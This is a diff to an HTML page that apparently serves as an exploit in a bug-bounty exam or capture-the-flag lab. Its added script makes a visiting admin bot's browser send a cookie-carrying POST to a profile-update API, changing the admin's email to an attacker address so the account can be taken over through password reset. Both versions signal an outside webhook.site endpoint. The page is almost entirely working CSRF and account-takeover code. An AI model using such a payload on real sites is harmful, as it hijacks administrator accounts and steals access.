@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>System Diagnostic</title>
-</head>
 <body>
-    <h1>Loading Secure Portal...</h1>
+    <h1>System Update...</h1>
     <script>
-        // The ID of the message you just created
-        const messageId = "69e55888bee6d6b7c663702e";
-        const targetUrl = `https://bugbounty-exam.hashacademy.co/admin/messages/${messageId}`;
-
-        // Step 1: Log the visit to your webhook so you know the bot is active
-        fetch("https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?status=bot_arrived");
-
-        // Step 2: Force the Admin Bot to navigate to your message
-        // We use a small timeout to ensure the browser registers the session
-        setTimeout(() => {
-            window.location.href = targetUrl;
-        }, 500);
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/update-profile";
+        
+        // This forces the Admin's browser to send a POST request to change their email
+        fetch(target, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                "email": "ladybughunter1@gmail.com", // Change this to your email
+                "fullName": "Saja_Admin_ATO"
+            }),
+            credentials: "include" // This is CRITICAL - it sends the Admin's session cookie
+        }).then(() => {
+            // After changing the email, the flag might be in the response or 
+            // you can now use "Forgot Password" to take over the account.
+            window.location.href = "https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b?status=ATO_Attempted";
+        });
     </script>
 </body>
 </html>
